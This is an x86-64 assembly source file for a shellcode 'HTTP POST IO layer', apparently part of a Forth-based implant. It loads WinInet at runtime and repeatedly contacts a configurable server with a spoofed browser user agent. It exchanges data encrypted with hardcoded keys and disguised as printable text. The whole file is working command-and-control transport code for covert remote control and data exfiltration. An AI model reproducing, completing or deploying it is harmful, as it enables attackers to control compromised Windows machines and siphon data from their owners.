;;; WININET IO layer using HTTP POST requests

;;; These define the connection parameters, and can be overridden when
;;; assembling the shellcode.

%ifndef HTTPINTERVAL
	%define HTTPINTERVAL 1000
%endif
	
%ifndef HTTPHOST
	%define HTTPHOST "127.0.0.1"
%endif

%ifndef HTTPPORT
	%define HTTPPORT 1920
%endif
	
%ifndef HTTPURI
	%define HTTPURI "/feed"
%endif

%ifndef HTTPVERB
	%define HTTPVERB "PATCH"
%endif

%ifndef USERAGENT
	%define USERAGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
%endif

%ifndef INKEY
	%define INKEY  `\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b`
%endif

%ifndef OUTKEY
	%define OUTKEY `\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52`
%endif
	
;;; Put a number on the stack identifying which IO engine this is.  Each IO layer
;;; needs to have its own unique ID.  This allows payloads to make decisions
;;; based on the configured IO.
	
start_def ASM, engine, "engine"
 	pushthing 3		; We'll take #3 for the HTTP POST IO layer
end_def engine

;;; This function will be called before any IO is performed.  This can be used to
;;; set up streams, initialize IO layer global variables, make network connections,
;;; etc.
	
start_def ASM, initio, "initio"
	;; Align the stack and make space for a bunch of Win32 calls
	push rbp
	mov rbp, rsp
	and rsp, -16
	sub rsp, 0x50

	;; connection parameters
	InlineString HTTPHOST, rcx, rax
	AddGlobal G_HTTP_HOST, rcx
	mov rax, HTTPPORT
	AddGlobal G_HTTP_PORT, rax
	InlineString HTTPURI, rcx, rax
	AddGlobal G_HTTP_URI, rcx
	InlineString HTTPVERB, rcx, rax
	AddGlobal G_HTTP_VERB, rcx
	
	call .b
.a:     db "wininet.dll", 0
.1:	db "InternetOpenA", 0
.2:	db "InternetReadFile", 0
.3:	db "InternetCloseHandle", 0
.4:	db "InternetConnectA", 0
.5:	db "HttpSendRequestA", 0
.6:	db "HttpOpenRequestA", 0
.7:	db "HttpQueryInfoA", 0
.b:     pop rbx
	
	lea rcx, [rbx]
	call W32_LoadLibraryA
	AddGlobal G_WININET, rax

	mov rsi, W32_GetProcAddress
	mov rdi, rax
	GetProcAddress .1 - .a, W32_InternetOpen
	GetProcAddress .2 - .a,	W32_InternetReadFile
	GetProcAddress .3 - .a,	W32_InternetCloseHandle
	GetProcAddress .4 - .a,	W32_InternetConnect
	GetProcAddress .5 - .a,	W32_HttpSendRequest
	GetProcAddress .6 - .a,	W32_HttpOpenRequest
	GetProcAddress .7 - .a,	W32_HttpQueryInfo
	
	;; Initialize Internet Connection
	InlineString USERAGENT, rcx, rax
	xor edx, edx		     ; INTERNET_OPEN_TYPE_PRECONFIG is flag 0
	mov r8, rdx		     ; Specify NULL proxy
	mov r9, rdx		     ; Specify NULL proxy bypass param
	mov QWORD [rsp + 0x20], rdx  ; Specify no flags, normal connection
	call W32_InternetOpen	     ; ...
	AddGlobal G_INET, rax	     ; save handle to internet connection
	
	;; Set up state vars for this IO layer
	call W32_GetTickCount	     ; Use ticks to throttle HTTP calls
	AddGlobal G_LASTINET, rax    ; ...

	;; Make some space for HTTP transfers
	xor ecx, ecx		     ; Let kernel choose address
	mov edx, 16384               ; buffer space
	mov r8, 0x3000		     ; Reserve and commit the space
	mov r9, 4		     ; PAGE_READWRITE permissions
	call W32_VirtualAlloc	     ; allocate space
	AddGlobal G_INETBUFFER, rax  ; save it here

	AddGlobal G_NEXTOUT, rax     ; output buffer is bottom 2KB
	AddGlobal G_LASTOUT, rax     ; next available space in the output buffer
	add rax, 2048		     ; input buffer is top 2KB
	AddGlobal G_LASTIN, rax	     ; ...
	dec rax
	AddGlobal G_NEXTIN, rax	     ; ...
	add rax, 2049		     ; 4096 bytes for packet material
	AddGlobal G_POST, rax	     ; for POST requests
	
	add rax, 4096		     ; space for crypto state
	AddGlobal G_INSTATE, rax     ; input stream crypto state
	add rax, 512		     ; ...
	AddGlobal G_OUTSTATE, rax    ; output stream crypto state

	mov eax, HTTPINTERVAL	     ; ping interval
	AddGlobal G_PINGMS, rax	     ; ...
	xor eax, eax		     ; A way to keep track of bytes that don't fit
	AddGlobal G_PENDING, rax     ;
	AddGlobal G_RESPONSE, rax    ; a flag to signal when the server says there's more data to receive
	AddGlobal G_CHARBUF, rax     ; 
	
	;; initialize crypto stuff
.io1:	InlineString INKEY, rax, rcx ; key for input stream
	pushthing rax
	pushthing rcx
	pushthing G_INSTATE
	call code_cryptinit
	
.io2:	InlineString OUTKEY, rax, rcx ; key for output stream
.io3:	pushthing rax
	pushthing rcx
	pushthing G_OUTSTATE
	call code_cryptinit

	;; restore stack
	mov rsp, rbp
	pop rbp
end_def initio
		
;;; Take a value from the stack and emit it to the output stream as a single byte.

start_def ASM, emit, "emit"
	;; check available space
	mov rax, G_LASTOUT      ; start at the last available space
	sub rax, G_INETBUFFER	; subtract the base address
	cmp rax, 2048		; compare to buffer size
	jl .avail		; as long as there's space, we can store
	
	;; wait for send / receive
	;; never mind, no delay for sending data!
	;; call net_delay

	;; transceive
	call net_transceive

	;; store a byte for output
.avail:
	mov rax, G_LASTOUT	; last byte available to store
	mov [rax], dil		; store the byte
	popthing rax		; pop from data stack
	inc QWORD G_LASTOUT	; move last output pointer

end_def emit
	
;;; Read a single byte from the input stream and put its value on top of the stkack.
	
start_def ASM, key, "key"
	;; check if bytes are currently available
	mov rax, G_NEXTIN	; compare input pointers
	mov rbx, G_LASTIN	; ...
	inc rax			; off by one otherwise
	cmp rax, rbx		; ...
	jne .avail		; as long as NEXTIN < LASTIN, there's data to read

	;; reset the input buffer
	mov rax, G_INETBUFFER	; find input buffer base
	add rax, 2048		; ...
	mov G_LASTIN, rax	; reset the pointers
	dec rax			; ...
	mov G_NEXTIN, rax	; ...
	
	;; check if we have output to send, rather than wait
	mov rcx, G_LASTOUT	; first unused space in output buffer
	sub rcx, G_INETBUFFER	; count bytes to send
	jnz .nodelay		; skip the delay

	;; wait for send / receive
	call net_delay

.nodelay:
	;; transceive
	call net_transceive
	jmp code_key		; loop until we have input

	;; grab a byte from input
.avail:
	inc QWORD G_NEXTIN	; move to next byte of input
	mov rax, G_NEXTIN	; get pointer to next byte
	pushthing 1		; make a spot on the stack
	mov dil, [rax]		; get the byte onto the stack

	cmp dil, 0x0a
	jne .skip
	inc QWORD G_LINENO
.skip:

end_def key

;;; Given a buffer and length, send multiple bytes to the output stream.  This is
;;; largely provided as a convenience for situations where IO can be optimized
;;; for block communications.

start_def ASM, type, "type"
	popthing rcx
	popthing rsi

.loop:
	pushthing [rsi]
	and rdi, 0xff
	push rcx
	push rsi
	call code_emit
	pop rsi
	pop rcx
	inc rsi
	loop .loop
end_def type

;;; Enable and disable echoing of input to the output stream.  Some IO
;;; layers may prefer to allow this to be configurable.  Leave them empty
;;; if they don't make sense for your IO layer.
	
start_def ASM, response, "response"
	pushthing G_RESPONSE
end_def response

start_def ASM, pingms, "delay"
	pushthing r15
	add rdi, G_PINGMS_OFF
end_def pingms

start_def ASM, echooff, "-echo"
end_def echooff

start_def ASM, echoon, "+echo"
end_def echoon

start_def ASM, setecho, "!echo"
end_def setecho


;;; ------------------------------------------------------------------------
;;; Some support functions that don't need to pollute the dictionary space
;;; ------------------------------------------------------------------------
	
;;; We don't want to send output or check for input too frequently, so we
;;; sometimes 
net_delay:
	push rbp		; 
	mov rbp, rsp		; save stack
	sub rsp, 0x20		; make shadow space
	and rsp, -16		; align stack just in case

	mov rcx, G_RESPONSE	; get last response code
	cmp rcx, 0x323032	; if our last code was 202, server says don't delay
	je .done		; skip the delay
	
.loop:
	call W32_GetTickCount	; get our current tick count
	mov rbx, G_LASTINET	; last time we sent
	add rbx, G_PINGMS 	; our definition of "awhile"
	sub rax, rbx		; get delta in milliseconds
	jns .done		; when the number is positive, it's been long enough
	mov rcx, 500		; sleep a bit so we don't burn CPU
	call W32_Sleep		; ...
	jmp .loop
.done:
	mov rsp, rbp		; restore stack
	pop rbp			; 
	ret

;;; We will send the contents of the output buffer, and possibly receive
;;; some input bytes from the server.	
net_transceive:
	push rbp
	xor ebp, ebp		; get a zero
	mov G_RESPONSE, rbp	; clear the extra data flag

	mov rbp, rsp		; save stack
	sub rsp, 0x50		; make space for shadow and fns with lots of args
	and rsp, -16		; align stack in case WININET cares

	call net_prepare	; maybe load some bytes for output (puts count in rax)
	mov [rsp+0x48], rax	; save the count for POSTing shortly
	
.retry:	mov rcx, G_INET		; handle to Internet Session (from initio)
	mov rdx, G_HTTP_HOST	; hostname to connect to
	mov r8, G_HTTP_PORT	; tcp port
	xor r9, r9		; username (no auth)
	mov [rsp+0x38], r9	; dwContext
	mov [rsp+0x30], r9	; dwFlags
	mov qword [rsp+0x28], 3	; dwService -- INTERNET_SERVICE_HTTP
	mov [rsp+0x20], r9	; lpszPassword (no auth)
	call W32_InternetConnect
	mov rbx, rax		; save the handle for this connection
	and rbx, rbx		; check for zero handle
	jnz .c1
	jmp .err		; error, delay and retry
	
.c1:	mov rcx, rbx		; connection handle
	mov rdx, G_HTTP_VERB	; POST, most likely
	mov r8, G_HTTP_URI	; set in define above
	xor r9, r9		; version
	mov [rsp+0x38], r9	; dwContext
	mov [rsp+0x30], r9	; dwFlags
	mov [rsp+0x28], r9	; lplpszAcceptTypes
	mov [rsp+0x20], r9	; lpszReferer
	call W32_HttpOpenRequest
	mov rsi, rax		; save handle for this request
	and rsi, rsi		; check for zero handle
	jnz .c2			; ...
	mov rcx, rbx		; close the open handle we know about
	call W32_InternetCloseHandle
	jmp .err

.c2:	mov rcx, rsi		; hRequest
	xor edx, edx		; lpszHeaders
	mov r8, rdx		; dwHeadersLength
	mov r9, G_POST		; lpOptional -- POST data
	mov rax, [rsp+0x48]	; get POST data length
	mov [rsp+0x20], rax	; make it the 5th parameter
	call W32_HttpSendRequest
	and rax, rax		; check for false reply
	jnz .c3
	mov rcx, rsi
	call W32_InternetCloseHandle
	mov rcx, rbx
	call W32_InternetCloseHandle
	jmp .err

.c3:	call W32_GetTickCount	; get current time
	mov G_LASTINET, rax	; and record it so we know when we talked

	mov rcx, rsi		; hRequest
	mov rdx, G_POST		; buffer to receive data
	mov r8, 4096		; max block for receiving data
	lea r9, [r15 + G_PENDING_OFF ] ; 
.read:	call W32_InternetReadFile
	
	mov rcx, G_PENDING	; bytes to process from POST reply
	call net_consume	; convert bytes and put in input buffer

	;; check response code to see if there's more data to come
	xor ecx, ecx		; get a 0
	mov rdx, G_HERE		; get address of next space in dictionary
	mov [rdx], rcx		; indicate index 0
	mov [rsp+0x20], rdx	; lpdwIndex
	
	mov rcx, rsi		; hRequest
	mov rdx, 19		; HTTP_QUERY_STATUS_CODE
	mov r8, r15		; global table base
	add r8, G_RESPONSE_OFF	; offset to RESPONSE flag
	mov QWORD G_CHARBUF, 8	; size of QWORD
	mov r9, r15
	add r9, G_CHARBUF_OFF 	; lpdwBufferLength
.q:	call W32_HttpQueryInfo	; ...
	
	;; close handles we opened during this transception
	mov rcx, rsi		; request handle
	call W32_InternetCloseHandle
	mov rcx, rbx		; connection handle
	call W32_InternetCloseHandle
	
	mov rsp, rbp		; restore stack
	pop rbp
.done:	ret

.err:	call W32_GetTickCount	; get current time
	mov G_LASTINET, rax	; update last stamp so delay will work
	call net_delay		; wait awhile
	jmp .retry		; go back to where it all began

	
;;; Prepare output buffer for sending in a POST request
net_prepare:	
	push rdi
	mov rsi, G_INETBUFFER	; start encoding bytes here
	mov rdi, G_POST		; put encoded values here
	mov rcx, G_LASTOUT	; first unused space in output buffer
	sub rcx, G_INETBUFFER	; count bytes to send
	jz .done		; if count is 0, we're done before we start
	
	;; encrypt the output data
.go:	push rbx
	push rsi
	push rcx
	push rdi
	mov rdi, rcx
	mov rbx, G_OUTSTATE
	call crypt_encrypt
	pop rdi
	pop rcx
	pop rsi
	pop rbx

	
.loop:  mov al, [rsi]		; get a byte
	mov ah, al		; make a copy
	and ax, 0xf00f		; mask off the bits in each nybble
	shr ah, 4		; each is a proper nybble
	add ax, 0x4141		; make the nybbles printable
	mov [rdi], ah		; write high nybble
	mov [rdi+1], al		; write low nybble
	add rdi, 2		; move destination to next location
	inc rsi			; move source to next location
	loop .loop		; loop until done
	
.done:	mov rax, rdi		; save where we ended up
	sub rax, G_POST		; get number of bytes to POST
	
	mov rdx, G_INETBUFFER	; reset output buffer since we moved it to the POST buffer
	mov G_LASTOUT, rdx	; ...

	pop rdi
	ret

;;; Consume input from POST reply and put it in the input buffer
net_consume:
	push rdi
	push rsi
	
	and rcx, rcx		; check if we have any to read at all
	jz .done		; and skip if it's zero
	shr rcx, 1		; divide by two because they are nybbles

	mov rsi, G_POST		; data comes from here
	mov rdi, G_LASTIN	; data goes here -- hmm, what happens if it fills up???
	
	push rdi
	push rcx
	
.loop:	mov ah, [rsi]		; first nybble is high side of input byte
	mov al, [rsi+1]		; second nybble is low wide of input byte
	sub ax, 0x4141		; shift out of ASCII range
	shl ah, 4		; split the nybbles
	or al, ah		; combine them
	mov [rdi], al		; store the byte
	add rsi, 2		; move source pointer
	inc rdi			; move destination pointer
	loop .loop		; continue until we're done

	mov G_LASTIN, rdi	; save spot
	
	pop rcx
	pop rsi

	;; decrypt data
.go:	push rbx
	push rsi
	push rcx
	push rdi
	mov rdi, rcx
	mov rbx, G_INSTATE
	call crypt_encrypt
	pop rdi
	pop rcx
	pop rsi
	pop rbx
	
.done:	
	pop rsi
	pop rdi
	ret

